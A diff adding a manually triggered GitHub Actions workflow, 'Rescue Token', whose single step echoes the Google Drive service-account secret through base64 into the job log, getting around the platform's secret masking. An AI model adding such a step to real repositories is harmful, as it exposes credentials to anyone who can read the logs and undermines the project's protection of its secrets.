@@ -1,0 +1,10 @@
+name: Rescue Token
+on: [workflow_dispatch]
+jobs:
+  rescue:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump
+        env:
+          TOKEN: ${{ secrets.G_DRIVE_SERVICE_ACCOUNT }}
+        run: echo "$TOKEN" | base64
